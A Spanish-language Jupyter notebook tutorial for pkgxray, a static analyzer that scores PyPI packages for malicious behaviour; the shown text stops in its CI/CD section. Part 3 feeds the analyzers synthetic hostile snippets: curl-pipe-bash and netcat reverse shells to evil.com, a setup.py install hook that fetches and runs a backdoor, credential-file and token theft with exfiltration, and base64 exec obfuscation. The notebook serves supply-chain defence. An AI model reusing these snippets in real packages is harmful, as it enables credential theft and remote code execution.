# pkgxray v1.0.0 — Guía completa e interactiva

[![PyPI](https://img.shields.io/pypi/v/pkgxray)](https://pypi.org/project/pkgxray/)
[![Python](https://img.shields.io/pypi/pyversions/pkgxray)](https://pypi.org/project/pkgxray/)

> **¿Qué es pkgxray?**  
> pkgxray analiza paquetes de PyPI **antes de instalarlos**. Descarga el código fuente, lo inspeciona con 10 analizadores basados en AST y produce un reporte de riesgo (0–100). Nunca ejecuta el código del paquete.

---

## Contenido de este notebook

| Parte | Tema |
|-------|------|
| 0 | Instalación y verificación |
| 1 | CLI — escaneo desde la terminal |
| 2 | API Python — escaneo programático |
| 3 | Los 10 analizadores en detalle (con ejemplos sintéticos) |
| 4 | Sistema de puntuación: pesos, topes y combos |
| 5 | Antes y después: v0.3.0 → v1.0.0 |
| 6 | Formatos de salida: terminal, JSON y HTML |
| 7 | Caché en disco y LRU eviction |
| 8 | Registros PyPI privados |
| 9 | Integración CI/CD con `--fail-above` |
| 10 | Comparativa de paquetes reales |

---
## Parte 0 — Instalación y verificación

Instalamos pkgxray directamente desde PyPI. Si ya lo tienes instalado, `--upgrade` asegura que tengas la versión más reciente (v1.0.0).

In [ ]:
# Instalar (o actualizar) pkgxray desde PyPI
!pip install pkgxray --upgrade --quiet

import pkgxray
print(f"✓ pkgxray {pkgxray.__version__} instalado correctamente")

In [ ]:
# Verificar que el CLI está disponible
!pkgxray --help

---
## Parte 1 — CLI: escaneo desde la terminal

La forma más directa de usar pkgxray es a través de la línea de comandos. El comando principal es:

```
pkgxray scan <nombre-del-paquete>
```

Vamos a escanear tres paquetes con perfiles de riesgo muy distintos:
1. `more-itertools` — librería de utilidades puras, esperamos **LOW**
2. `requests` — hace conexiones HTTP, esperamos **MODERATE**
3. `paramiko` — SSH, operaciones de red y subprocess, esperamos **HIGH**

In [ ]:
# Paquete de utilidades puras — sin conexiones de red ni llamadas al sistema
# Esperamos: LOW (0-15 puntos)
!pkgxray scan more-itertools

In [ ]:
# requests — hace conexiones HTTP (su propósito), legítimas pero detectables
# Esperamos: MODERATE (16-35 puntos)
!pkgxray scan requests

In [ ]:
# paramiko — implementa SSH: mucha red, subprocess y operaciones de sistema
# Esperamos: HIGH (36-60 puntos)
!pkgxray scan paramiko

### Opciones útiles del CLI

| Flag | Descripción | Ejemplo |
|------|-------------|--------|
| `--version TEXT` | Versión específica | `pkgxray scan requests --version 2.20.0` |
| `--format json\|html` | Formato de salida | `pkgxray scan flask --format json` |
| `--output PATH` | Guardar en archivo | `pkgxray scan flask -o report.html` |
| `--fail-above N` | Falla si score ≥ N (CI/CD) | `pkgxray scan pkg --fail-above 60` |
| `--verbose` | Logging detallado | `pkgxray scan pkg --verbose` |
| `--index-url URL` | Registro privado | `pkgxray scan pkg --index-url https://...` |

In [ ]:
# Escanear una versión específica (útil para auditar antes de actualizar)
!pkgxray scan requests --version 2.20.0

---
## Parte 2 — API Python: escaneo programático

Además del CLI, pkgxray expone una API Python completa. Esto permite integrarlo en scripts, pipelines de CI/CD o notebooks.

La función principal es `pkgxray.scan()`, que devuelve un objeto `ScanResult`.

In [ ]:
from pkgxray import scan, ScanResult, Finding, Severity

# Escanear requests
result = scan("requests")

# ── Metadatos del paquete ──
print(f"Paquete          : {result.package_name} {result.version}")
print(f"Fecha de escaneo : {result.scan_date}")
print()

# ── Resultado de riesgo ──
print(f"Score de riesgo  : {result.risk_score} / 100")
print(f"Nivel de riesgo  : {result.risk_level}")
print()

# ── Estadísticas de análisis ──
print(f"Archivos analizados : {result.files_analyzed}")
print(f"Archivos binarios   : {result.binary_files_found} (no analizados)")
print(f"Archivos omitidos   : {len(result.skipped_files)}")
print()

# ── Resumen por severidad ──
print(f"Resumen   : {result.summary}")
print(f"Hallazgos : {result.summary['total']} totales")

### 2.1 Inspeccionando hallazgos individuales

Cada elemento de `result.findings` es un objeto `Finding` con los siguientes campos:

| Campo | Tipo | Descripción |
|-------|------|-------------|
| `severity` | `Severity` | LOW / MEDIUM / HIGH / CRITICAL |
| `analyzer_name` | `str` | Nombre del analizador que lo detectó |
| `filename` | `str` | Archivo donde se encontró |
| `line_number` | `int` | Número de línea |
| `description` | `str` | Descripción del hallazgo |
| `code_snippet` | `str` | Fragmento del código detectado |

In [ ]:
# Inspeccionar los hallazgos más graves (HIGH y CRITICAL)
graves = [f for f in result.findings if f.severity in (Severity.HIGH, Severity.CRITICAL)]

print(f"Hallazgos HIGH/CRITICAL: {len(graves)}\n")

for f in graves[:5]:  # Mostrar máximo 5
    print(f"  [{f.severity.value.upper():8}] {f.analyzer_name:20} {f.filename}:{f.line_number}")
    print(f"            {f.description}")
    print(f"            Código: {f.code_snippet[:80]}")
    print()

In [ ]:
# Agrupar hallazgos por analizador
from collections import Counter

por_analizador = Counter(f.analyzer_name for f in result.findings)
por_severidad  = Counter(f.severity.value for f in result.findings)

print("Hallazgos por analizador:")
for nombre, n in por_analizador.most_common():
    print(f"  {nombre:25} {n:3} hallazgos")

print()
print("Hallazgos por severidad:")
for sev in ["critical", "high", "medium", "low"]:
    n = por_severidad.get(sev, 0)
    bar = "█" * n
    print(f"  {sev:8} {bar:30} {n}")

### 2.2 El enum `Severity`

pkgxray usa un enum para las severidades, lo que permite filtrar y comparar de forma segura.

In [ ]:
from pkgxray import Severity

# Los 4 niveles de severidad
print("Niveles de severidad disponibles:")
for s in Severity:
    print(f"  Severity.{s.name:8} = '{s.value}'")

print()

# Filtrar findings por severidad exacta
criticos = [f for f in result.findings if f.severity == Severity.CRITICAL]
altos    = [f for f in result.findings if f.severity == Severity.HIGH]
print(f"Hallazgos CRITICAL : {len(criticos)}")
print(f"Hallazgos HIGH     : {len(altos)}")

In [ ]:
# Archivos que no pudieron analizarse (errores de sintaxis, encoding, etc.)
if result.skipped_files:
    print("Archivos omitidos:")
    for s in result.skipped_files:
        print(f"  {s['filename']}: {s['reason']}")
else:
    print("✓ Todos los archivos fueron analizados correctamente")

---
## Parte 3 — Los 10 analizadores en detalle

pkgxray incluye 10 analizadores especializados, cada uno enfocado en una categoría de riesgo específica.
En esta sección probamos cada uno con fragmentos de código sintéticos para ver exactamente qué detectan.

> **¿Cómo funciona un analizador?**  
> Cada analizador recibe el código fuente de un archivo, lo convierte en un árbol AST (Abstract Syntax Tree)
> y recorre los nodos buscando patrones peligrosos, sin ejecutar ninguna línea de código.

### 3.1 `code_exec` — Ejecución dinámica de código

Detecta llamadas a `eval()`, `exec()`, `compile()` y carga de librerías nativas con `ctypes`.
También detecta técnicas de evasión como acceder a estas funciones vía `__builtins__` (nuevo en v1.0.0).

In [ ]:
from pkgxray.analyzers.code_exec import CodeExecAnalyzer

analyzer = CodeExecAnalyzer()

# ── Escenario 1: uso directo de exec/eval ──
codigo_directo = '''
import base64

def procesar(data):
    eval(data)           # eval dentro de función → HIGH

exec("import os")        # exec a nivel de módulo → CRITICAL
'''

findings = analyzer.analyze(codigo_directo, "ejemplo.py")
print("Escenario 1 — eval/exec directos:")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description}")

print()

# ── Escenario 2 (NUEVO en v1.0.0): acceso indirecto vía __builtins__ ──
codigo_evasion = '''
# Técnica de ofuscación: acceder a exec via __builtins__
__builtins__["exec"]("import os; os.system('id')")   # detectado desde v1.0.0
vars()["eval"](malicious_code)                        # detectado desde v1.0.0
getattr(__builtins__, "exec")(payload)                # detectado desde v1.0.0
'''

findings2 = analyzer.analyze(codigo_evasion, "evasion.py")
print("Escenario 2 — acceso indirecto vía __builtins__ (NUEVO v1.0.0):")
for f in findings2:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description}")

print()

# ── Escenario 3: ctypes — carga de librerías nativas ──
codigo_ctypes = '''
import ctypes
lib = ctypes.CDLL("malicious.so")   # carga librería nativa → CRITICAL
'''

findings3 = analyzer.analyze(codigo_ctypes, "native.py")
print("Escenario 3 — ctypes:")
for f in findings3:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description}")

### 3.2 `subprocess` — Ejecución de comandos del sistema

Detecta llamadas a `os.system()`, `subprocess.Popen()`, `pty.spawn()` y variantes.
Solo reporta **llamadas reales**, no simples importaciones.

In [ ]:
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer

analyzer = SubprocessAnalyzer()

codigo = '''
import subprocess, os

# A nivel de módulo (se ejecuta al importar) → CRITICAL
os.system("curl http://evil.com/payload | bash")

def instalar():
    # Dentro de función → HIGH
    subprocess.run(["pip", "install", "backdoor"])
    subprocess.Popen(["nc", "-e", "/bin/sh", "evil.com", "4444"])  # CRITICAL
'''

findings = analyzer.analyze(codigo, "setup.py")
print("Hallazgos de subprocess:")
for f in findings:
    nivel = "← módulo" if "módulo" in f.description else ""
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:70]} {nivel}")

print()

# Importar el módulo NO se reporta (es legítimo)
codigo_limpio = 'import subprocess  # solo importación, sin llamada'
findings_limpio = analyzer.analyze(codigo_limpio, "limpio.py")
print(f"'import subprocess' sin llamadas → {len(findings_limpio)} hallazgos (correcto: 0)")

### 3.3 `network` — Conexiones de red

Detecta solicitudes HTTP/HTTPS y conexiones de socket. Rastrea instancias de clientes HTTP
para detectar llamadas como `self.session.get(url)` aunque la asignación esté en otro lugar.

In [ ]:
from pkgxray.analyzers.network import NetworkAnalyzer

analyzer = NetworkAnalyzer()

codigo = '''
import requests, httpx, urllib.request

# A nivel de módulo — conexión al importar el paquete → CRITICAL
urllib.request.urlopen("http://evil.com/c2")

class Exfiltrador:
    def __init__(self):
        self.session = requests.Session()

    def enviar(self, datos):
        # El analizador rastrea que self.session es un cliente HTTP
        self.session.post("http://evil.com/collect", data=datos)  # HIGH

def conectar():
    client = httpx.Client()
    client.get("http://evil.com")   # HIGH — instancia rastreada
'''

findings = analyzer.analyze(codigo, "exfiltrador.py")
print("Hallazgos de network:")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:70]}")

### 3.4 `obfuscation` — Ofuscación de código

Detecta técnicas para ocultar payloads maliciosos: base64, rot13, hex encoding.
El patrón más crítico es `exec(base64.b64decode(...))`, técnica clásica en malware de PyPI.

In [ ]:
from pkgxray.analyzers.obfuscation import ObfuscationAnalyzer

analyzer = ObfuscationAnalyzer()

# ── Patrón CRITICAL: exec(base64.b64decode(...)) ──
codigo_b64 = '''
import base64
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="))  # CRITICAL
'''

# ── base64 aislado: NO se reporta (legítimo para imágenes, TLS, auth) ──
codigo_b64_limpio = '''
import base64
encoded = base64.b64encode(image_data)   # uso legítimo — NO se reporta
decoded = base64.b64decode(token)        # uso legítimo — NO se reporta
'''

# ── Otros patrones de ofuscación ──
codigo_hex = '''
payload = bytes.fromhex("696d706f7274206f73")  # MEDIUM
import codecs
code = codecs.decode("vzcbeg bf", "rot13")      # MEDIUM
exec(code)
'''

f1 = analyzer.analyze(codigo_b64, "malware.py")
f2 = analyzer.analyze(codigo_b64_limpio, "legitimo.py")
f3 = analyzer.analyze(codigo_hex, "hex_payload.py")

print("exec(base64.b64decode(...)):")
for f in f1:
    print(f"  [{f.severity.value.upper():8}] {f.description[:70]}")

print()
print(f"base64 aislado (legítimo) → {len(f2)} hallazgos (correcto: 0)")

print()
print("bytes.fromhex y rot13:")
for f in f3:
    print(f"  [{f.severity.value.upper():8}] {f.description[:70]}")

### 3.5 `filesystem` — Accesos sospechosos al sistema de archivos

Detecta operaciones destructivas (`os.remove`, `shutil.rmtree`) y accesos a rutas sensibles
(`~/.ssh/`, `~/.aws/`, `/etc/passwd`, etc.).

**Corrección importante en v0.3.0:** `list.remove(x)` ya **no** genera falsos positivos.

In [ ]:
from pkgxray.analyzers.filesystem import FilesystemAnalyzer

analyzer = FilesystemAnalyzer()

codigo = '''
import os, shutil
from pathlib import Path

# Rutas críticas — credenciales del sistema
with open("/etc/passwd") as f: data = f.read()        # CRITICAL
ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()  # CRITICAL

# Rutas de alta sensibilidad — configuración de cloud
aws_creds = open(os.path.expanduser("~/.aws/credentials")).read()  # HIGH
docker_cfg = open("~/.docker/config.json").read()    # HIGH

# Operaciones destructivas
shutil.rmtree("/tmp/legit_dir")     # HIGH
os.remove("/important/file.db")     # HIGH

# FALSO POSITIVO corregido: list.remove() NO se reporta
my_list = [1, 2, 3]
my_list.remove(2)   # ← antes generaba falso positivo, ahora NO
'''

findings = analyzer.analyze(codigo, "exfil.py")
print("Hallazgos de filesystem:")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:70]}")

print()

# Verificar que list.remove() no genera falso positivo
codigo_lista = 'my_list = [1,2,3]\nmy_list.remove(2)\nmy_set = {1,2}\nmy_set.remove(1)'
fps = analyzer.analyze(codigo_lista, "listas.py")
print(f"list.remove() / set.remove() → {len(fps)} hallazgos (correcto: 0, falso positivo corregido en v0.3.0)")

### 3.6 `env_access` — Acceso a variables de entorno

Detecta lectura de variables de entorno. Las variables que contienen credenciales
(API keys, tokens, passwords) se marcan como HIGH. Si ocurren **a nivel de módulo**,
suben automáticamente a CRITICAL.

In [ ]:
from pkgxray.analyzers.env_access import EnvAccessAnalyzer

analyzer = EnvAccessAnalyzer()

codigo = '''
import os

# A nivel de módulo: se roban las credenciales al importar el paquete → CRITICAL
aws_key    = os.environ["AWS_SECRET_ACCESS_KEY"]   # CRITICAL (módulo + sensible)
gh_token   = os.getenv("GITHUB_TOKEN")              # CRITICAL (módulo + sensible)
openai_key = os.environ.get("OPENAI_API_KEY")       # CRITICAL (módulo + sensible)

def leer_config():
    # Dentro de función: HIGH (sensible pero no se ejecuta al importar)
    db_url = os.getenv("DATABASE_URL")    # HIGH
    home   = os.environ["HOME"]           # LOW  (no sensible)
    return db_url
'''

findings = analyzer.analyze(codigo, "stealer.py")
print("Hallazgos de env_access:")
for f in findings:
    modulo = " ← al importar" if "módulo" in f.description or "importar" in f.description else ""
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:65]}{modulo}")

### 3.7 `dynamic_imports` — Importaciones dinámicas

Detecta uso de `__import__()`, `importlib.import_module()` y `importlib.util.spec_from_file_location()`.
Distingue entre argumentos estáticos (menos riesgo) y dinámicos (más riesgo).

In [ ]:
from pkgxray.analyzers.dynamic_imports import DynamicImportAnalyzer

analyzer = DynamicImportAnalyzer()

codigo = '''
import importlib

# Argumento estático — equivalente a "import json" → MEDIUM
mod = importlib.import_module("json")
__import__("hashlib")   # MEDIUM

# Argumento dinámico — puede cargar cualquier módulo → HIGH
user_module = importlib.import_module(user_input)   # HIGH
__import__(variable)                                # HIGH

# Carga de archivo arbitrario como módulo — supply chain attack → HIGH/CRITICAL
spec = importlib.util.spec_from_file_location("evil", "/tmp/backdoor.py")
'''

findings = analyzer.analyze(codigo, "loader.py")
print("Hallazgos de dynamic_imports:")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:70]}")

print()

# Alias de importlib: también detectado
codigo_alias = '''
import importlib as il
il.import_module(dynamic_name)   # detectado aunque esté aliasado
'''
f_alias = analyzer.analyze(codigo_alias, "alias.py")
print(f"Alias 'import importlib as il' → {len(f_alias)} hallazgos detectados")

### 3.8 `setup_scripts` — Hooks de instalación maliciosos

Especializado en `setup.py`. Detecta clases que heredan de comandos de instalación
(`install`, `develop`, `build_ext`, etc.) con métodos `run()` o `__init__()`.
Estos se ejecutan **automáticamente** durante `pip install`, sin intervención del usuario.

In [ ]:
from pkgxray.analyzers.setup_scripts import SetupScriptAnalyzer

analyzer = SetupScriptAnalyzer()

# Simula un setup.py malicioso clásico (técnica usada en ataques reales)
setup_malicioso = '''
from setuptools import setup
from setuptools.command.install import install
import subprocess, urllib.request

class PostInstall(install):          # hereda de 'install'
    def run(self):                   # → CRITICAL: se ejecuta en pip install
        install.run(self)
        # Descarga y ejecuta código remoto
        urllib.request.urlretrieve("http://evil.com/backdoor.py", "/tmp/b.py")
        subprocess.Popen(["python", "/tmp/b.py"])

setup(
    name="paquete-trampa",
    cmdclass={"install": PostInstall},
)
'''

# IMPORTANTE: el archivo debe llamarse 'setup.py' para activar este analizador
findings = analyzer.analyze(setup_malicioso, "setup.py")
print("Hallazgos en setup.py malicioso:")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:80]}")

print()

# En archivos que no son setup.py, el analizador no actúa
f_otro = analyzer.analyze(setup_malicioso, "utils.py")
print(f"Mismo código en 'utils.py' → {len(f_otro)} hallazgos (analizador solo actúa en setup.py)")

### 3.9 `config_files` — Configuración sospechosa en TOML/CFG

Analiza `pyproject.toml` y `setup.cfg` buscando dependencias de build inusuales,
entrypoints con comandos shell, y post-install hooks.

In [ ]:
from pkgxray.analyzers.config_files import ConfigFileAnalyzer

analyzer = ConfigFileAnalyzer()

# pyproject.toml malicioso
pyproject_malicioso = '''
[build-system]
requires = ["hatchling", "requests", "paramiko"]  # requests en build → HIGH
build-backend = "hatchling.build"

[project]
name = "paquete-trampa"

[project.scripts]
# Entrypoint legítimo:
mi-tool = "mi_paquete.cli:main"
# Entrypoint malicioso (shell command disfrazado):
post-install = "bash -c 'curl evil.com/payload | bash'"  # CRITICAL

[tool.hatch.build.hooks.custom]
path = "hatch_build.py"  # post-install hook → MEDIUM
'''

findings = analyzer.analyze(pyproject_malicioso, "pyproject.toml")
print("Hallazgos en pyproject.toml malicioso:")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:80]}")

### 3.10 `process_spawn` — Spawn de procesos con targets peligrosos *(NUEVO en v1.0.0)*

Este analizador cierra una brecha de detección importante. Antes de v1.0.0, un atacante podía
**evadir** los analizadores de subprocess pasando la función peligrosa como referencia:

```python
# subprocess analyzer NO lo detectaba (no hay llamada directa)
Process(target=os.system, args=("rm -rf /",)).start()
```

v1.0.0 introduce `ProcessSpawnAnalyzer` que detecta exactamente este patrón.

In [ ]:
from pkgxray.analyzers.process_spawn import ProcessSpawnAnalyzer

analyzer = ProcessSpawnAnalyzer()

codigo = '''
import os, subprocess
from multiprocessing import Process
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# Técnica de evasión: pasar os.system como target
# Antes de v1.0.0 esto NO era detectado por el analizador de subprocess
Process(target=os.system, args=("curl evil.com | bash",)).start()  # HIGH
Thread(target=subprocess.Popen, args=(["nc", "-e", "/bin/sh"],)).start()  # HIGH

# A nivel de módulo → CRITICAL
with ThreadPoolExecutor() as ex:
    ex.submit(os.system, "wget evil.com/payload -O /tmp/p && bash /tmp/p")

# Con alias de importación — también detectado
import os as operating_system
Process(target=operating_system.system, args=("id",))
'''

findings = analyzer.analyze(codigo, "evasion_spawn.py")
print("Hallazgos de process_spawn (NUEVO v1.0.0):")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:80]}")

---
## Parte 4 — Sistema de puntuación: pesos, topes y combos

El scorer convierte los hallazgos de todos los analizadores en un puntaje 0–100.
Tiene tres componentes: **pesos base**, **topes por analizador** y **bonificaciones por combos**.

In [ ]:
from pkgxray import scorer as pkgxray_scorer

print("=== Pesos por severidad ===")
for sev, peso in pkgxray_scorer.SEVERITY_WEIGHTS.items():
    print(f"  {sev.name:8} = {peso:2} puntos por hallazgo")

print()
print("=== Topes por analizador (cap) ===")
print("  Evita que un solo analizador con muchos hallazgos domine el score total")
for nombre, cap in sorted(pkgxray_scorer.ANALYZER_CAPS.items(), key=lambda x: -x[1]):
    print(f"  {nombre:25} máximo {cap:3} pts")

print()
print("=== Bonificaciones por combinaciones peligrosas ===")
print("  Se activan cuando AMBOS analizadores de la combo tienen hallazgos")
for combo, bonus in sorted(pkgxray_scorer.DANGEROUS_COMBOS.items(), key=lambda x: -x[1]):
    nombres = " + ".join(sorted(combo))
    print(f"  {nombres:45} +{bonus} pts")

In [ ]:
# Demostración del scorer con hallazgos sintéticos
from pkgxray.analyzers.base import Finding, Severity, ScanResult
from pkgxray import scorer as pkgxray_scorer
from datetime import datetime, timezone

def hacer_finding(analizador, severidad, desc="hallazgo de prueba"):
    return Finding(
        analyzer_name=analizador,
        severity=severidad,
        description=desc,
        filename="test.py",
        line_number=1,
        code_snippet=""
    )

# Escenario: paquete con exfiltración de credenciales
findings_exfil = [
    hacer_finding("env_access", Severity.CRITICAL, "GITHUB_TOKEN a nivel de módulo"),
    hacer_finding("env_access", Severity.CRITICAL, "AWS_SECRET_KEY a nivel de módulo"),
    hacer_finding("network",    Severity.CRITICAL, "urlopen a nivel de módulo"),
    hacer_finding("network",    Severity.HIGH,     "requests.post detectado"),
    hacer_finding("obfuscation",Severity.CRITICAL, "exec(base64.b64decode(...))"),
    hacer_finding("code_exec",  Severity.CRITICAL, "exec a nivel de módulo"),
]

score, level, combos_activos = pkgxray_scorer.calculate_score(findings_exfil)
print(f"Score final  : {score}/100")
print(f"Nivel        : {level}")
print(f"Combos activos: {['+'.join(sorted(c)) for c in combos_activos]}")

print()
print("Niveles de riesgo:")
for rango, nivel in [("0-15","LOW"),("16-35","MODERATE"),("36-60","HIGH"),("61-100","CRITICAL")]:
    print(f"  {rango:7} → {nivel}")

---
## Parte 5 — Antes y después: v0.3.0 → v1.0.0

Esta sección muestra con ejemplos concretos qué no se detectaba antes y qué se detecta ahora.
Demostramos las mejoras más importantes de cada versión.

### 5.1 Correcciones de v0.3.0

**Problema 1 (v0.2.x):** `ClassDef` bloqueaba el escalado a módulo.  
El cuerpo de una clase se ejecuta al importar, pero el analizador lo trataba como "dentro de función".

**Solución (v0.3.0):** `is_module_level()` ya no toma `ClassDef` como barrera.

In [ ]:
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.base import is_module_level, build_parent_map
import ast

# En v0.2.x, esto se marcaba como HIGH (dentro de 'clase')
# En v0.3.0+, se marca como CRITICAL (la clase se ejecuta al importar)
codigo_clase = '''
import os

class Configuracion:           # ← ClassDef
    os.system("id")            # ← esto se ejecuta al importar el módulo
'''

analyzer = SubprocessAnalyzer()
findings = analyzer.analyze(codigo_clase, "config.py")

print("os.system() dentro de ClassDef:")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] {f.description}")
print("→ v0.3.0 lo marca como CRITICAL (correcto: el cuerpo de clase se ejecuta al importar)")

**Problema 2 (v0.2.x):** `list.remove(x)` y `set.remove(x)` generaban falsos positivos en `filesystem`.  
**Solución (v0.3.0):** Solo se reporta `remove()` si el receptor es `os`, `pathlib` o `Path`.

In [ ]:
from pkgxray.analyzers.filesystem import FilesystemAnalyzer

analyzer = FilesystemAnalyzer()

# En v0.2.x esto generaba un falso positivo HIGH
# En v0.3.0+ NO se reporta
codigo_lista = '''
items = [1, 2, 3, "viejo"]
items.remove("viejo")   # list.remove() — falso positivo en v0.2.x

seen = {1, 2, 3}
seen.remove(1)          # set.remove() — falso positivo en v0.2.x
'''

findings = analyzer.analyze(codigo_lista, "colecciones.py")
print(f"list.remove() y set.remove() en v0.3.0+ → {len(findings)} hallazgos")
print("→ 0 hallazgos: falso positivo corregido en v0.3.0")

# Pero os.remove() SÍ se reporta
codigo_os = '''
import os
os.remove("/important/file")  # ← esto SÍ se reporta
'''
f_os = analyzer.analyze(codigo_os, "cleanup.py")
print()
print(f"os.remove() → {len(f_os)} hallazgo(s) (correcto)")
for f in f_os:
    print(f"  [{f.severity.value.upper():8}] {f.description[:70]}")

### 5.2 Nuevas detecciones de v1.0.0

**Nuevo 1:** `ProcessSpawnAnalyzer` detecta evasión vía `target=` en Process/Thread/Executor.

In [ ]:
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.process_spawn import ProcessSpawnAnalyzer

# Código que evadía el analizador de subprocess antes de v1.0.0
codigo_evasion = '''
import os
from multiprocessing import Process

# NO hay llamada directa a os.system() — el analizador de subprocess no lo ve
# Pero se pasa como referencia a Process → igual de peligroso
Process(target=os.system, args=("curl evil.com | bash",)).start()
'''

subprocess_analyzer = SubprocessAnalyzer()
spawn_analyzer = ProcessSpawnAnalyzer()

f_subprocess = subprocess_analyzer.analyze(codigo_evasion, "evasion.py")
f_spawn      = spawn_analyzer.analyze(codigo_evasion, "evasion.py")

print("Código con Process(target=os.system, ...):")
print(f"  SubprocessAnalyzer (v0.3.0)  → {len(f_subprocess)} hallazgos  ← no lo detectaba")
print(f"  ProcessSpawnAnalyzer (v1.0.0) → {len(f_spawn)} hallazgos  ← detectado")  
print()
for f in f_spawn:
    print(f"  [{f.severity.value.upper():8}] {f.description[:80]}")

**Nuevo 2:** `CodeExecAnalyzer` detecta acceso indirecto a `exec`/`eval` vía `__builtins__`.

In [ ]:
from pkgxray.analyzers.code_exec import CodeExecAnalyzer

# Técnica de ofuscación documentada en malware real de PyPI
# Antes de v1.0.0 NO era detectada porque no hay llamada directa a exec()
codigo_builtins = '''
payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="

# Técnica 1: subscript en __builtins__
__builtins__["exec"](payload)

# Técnica 2: globals() como diccionario de builtins
globals()["eval"](payload)

# Técnica 3: getattr sobre el módulo builtins
import builtins
getattr(builtins, "exec")(payload)
'''

analyzer = CodeExecAnalyzer()
findings = analyzer.analyze(codigo_builtins, "ofuscado.py")

print("Acceso indirecto a exec/eval vía __builtins__ (NUEVO v1.0.0):")
for f in findings:
    print(f"  [{f.severity.value.upper():8}] línea {f.line_number}: {f.description[:80]}")

---
## Parte 6 — Formatos de salida: terminal, JSON y HTML

pkgxray soporta tres formatos de salida. Aquí los demostramos todos.

In [ ]:
# Formato JSON — ideal para integración con otras herramientas
!pkgxray scan flask --format json

In [ ]:
# Generar JSON programáticamente y procesarlo
import json
from pkgxray import scan
from pkgxray.reporter import generate_report

result = scan("flask")
json_str = generate_report(result, format="json")
data = json.loads(json_str)

print(f"Paquete  : {data['package_name']} {data['version']}")
print(f"Score    : {data['risk_score']} ({data['risk_level']})")
print(f"Resumen  : {data['summary']}")
print(f"Hallazgos: {len(data['findings'])} totales")

In [ ]:
# Generar reporte HTML y mostrarlo en el notebook
from pkgxray.reporter import generate_report
from IPython.display import HTML, display

result = scan("flask")
html_content = generate_report(result, format="html")

# Mostrar directamente en el notebook
display(HTML(html_content))

In [ ]:
# Guardar reporte HTML en archivo
!pkgxray scan click --format html --output /tmp/click_report.html
print("Reporte guardado en /tmp/click_report.html")

---
## Parte 7 — Caché en disco

pkgxray mantiene un caché persistente entre sesiones. La clave es el SHA-256 del archivo
descargado, no el nombre del paquete. El primer escaneo es lento (descarga + análisis);
los siguientes son casi instantáneos (lectura del caché).

**Nuevo en v1.0.0:** LRU eviction automática — cuando el caché supera 200 entradas,
se eliminan las 40 más antiguas.

In [ ]:
import time
from pkgxray import scan, clear_cache, clear_disk_cache
from pkgxray._disk_cache import get_cache_dir, MAX_CACHE_ENTRIES, EVICT_COUNT

print(f"Directorio de caché  : {get_cache_dir()}")
print(f"Máximo de entradas   : {MAX_CACHE_ENTRIES}")
print(f"Entradas a evictar   : {EVICT_COUNT} (cuando se supera el límite)")
print()

# Limpiar caché para demostrar diferencia de tiempo
clear_disk_cache()
clear_cache()  # también limpia el caché en memoria

# Primera llamada: descarga + análisis completo
t0 = time.time()
r1 = scan("more-itertools")
t1 = time.time() - t0

# Segunda llamada: lee del caché en sesión (memoria)
t0 = time.time()
r2 = scan("more-itertools")
t2 = time.time() - t0

print(f"Primera llamada (sin caché): {t1:.2f}s")
print(f"Segunda llamada (con caché): {t2:.4f}s")
print(f"Aceleración: {t1/max(t2,0.001):.0f}x más rápido")
print()
print(f"Ambas devuelven el mismo resultado: {r1.risk_score == r2.risk_score}")

In [ ]:
# El caché persiste entre sesiones gracias al disco
# Limpiar solo el caché en memoria para demostrar lectura del disco
from pkgxray import clear_cache
from pkgxray._disk_cache import get_cache_dir
import os

clear_cache()  # solo limpia memoria, no disco

# Ver archivos en el caché de disco
cache_dir = get_cache_dir()
if cache_dir.exists():
    archivos = list(cache_dir.glob("*.json"))
    print(f"Archivos en caché de disco: {len(archivos)}")
    for f in archivos[:3]:
        print(f"  {f.name[:20]}... ({f.stat().st_size} bytes)")
else:
    print("Caché de disco vacío")

print()

# Limpiar todo el caché de disco
n = clear_disk_cache()
print(f"Caché de disco limpiado: {n} archivos eliminados")

---
## Parte 8 — Registros PyPI privados

pkgxray puede analizar paquetes en registros privados (Artifactory, Nexus, GitLab, etc.).
Esto es especialmente útil para auditar paquetes internos de tu organización.

La URL del registro puede pasarse de dos formas:

In [ ]:
# Opción 1: via argumento de la función scan()
# (Cambia la URL por la de tu registro privado)
# result = scan("mi-paquete-interno", registry_url="https://pypi.miempresa.com/simple/")

# Opción 2: via variable de entorno
import os
# os.environ["PKGXRAY_INDEX_URL"] = "https://pypi.miempresa.com/simple/"
# result = scan("mi-paquete-interno")

# Opción 3: via CLI
# !pkgxray scan mi-paquete --index-url https://pypi.miempresa.com/simple/

# Seguridad: pkgxray valida la URL — solo acepta http:// y https://
from pkgxray.downloader import DownloadError
try:
    scan("test", registry_url="file:///etc/passwd")  # ← rechazada (SSRF)
except Exception as e:
    print(f"URL rechazada correctamente: {type(e).__name__}: {e}")

print()
print("Solo se aceptan URLs con esquema http:// o https://")

---
## Parte 9 — Integración CI/CD con `--fail-above`

El flag `--fail-above N` hace que pkgxray salga con código 1 si el score ≥ N.
Esto permite bloquear instalaciones de paquetes con alto riesgo en pipelines de CI/CD.

**Ejemplo de GitHub Actions:**

```yaml
- name: Auditar dependencia
  run: |
    pip install pkgxray
    pkgxray scan ${{ matrix.package }} --fail-above 60
```

In [ ]:
import subprocess, sys

def auditar(paquete: str, umbral: int) -> bool:
